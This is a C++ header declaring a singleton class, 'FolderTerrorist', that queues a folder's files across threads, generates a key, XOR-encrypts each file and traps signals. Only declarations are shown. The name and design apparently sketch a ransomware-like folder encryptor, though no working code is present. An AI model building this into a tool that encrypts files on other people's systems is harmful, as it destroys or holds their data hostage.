#pragma once
#include <iostream>
#include <string>
#include <vector>
#include <list>
#include <thread>
#include <mutex>
#include <csignal>

class FolderTerrorist {
public:
    static FolderTerrorist *GetInstance() {
        if (!p_instance) {
            p_instance = new FolderTerrorist();
        }
        return p_instance;
    }

    void SetFolderName(const std::string &folderName);

    const std::string &GetFolderName() const;

    void Start(std::string mode);

    void Start(std::string path, std::string mode);

    void SetTheBorder(int border);

    void SignalsCatching();

    void KeyGen(size_t size);

    std::vector<uint8_t> GetKey();

private:
    FolderTerrorist();

    static inline FolderTerrorist *p_instance;

    std::string folder_name;

    std::vector<std::thread> threads;

    std::list<std::string> files_queue;

    std::mutex mtx;

    std::vector<std::string> GetFolderFiles();

    void UpdateQueue();

    void ReleaseQueue(std::string mode);

    std::vector<uint8_t> key;

    std::vector<uint8_t> keygen(size_t size);

    void XORencryption(const std::string &file_path);

    int border = -1;

    static void SignalsHandler(int signal);
};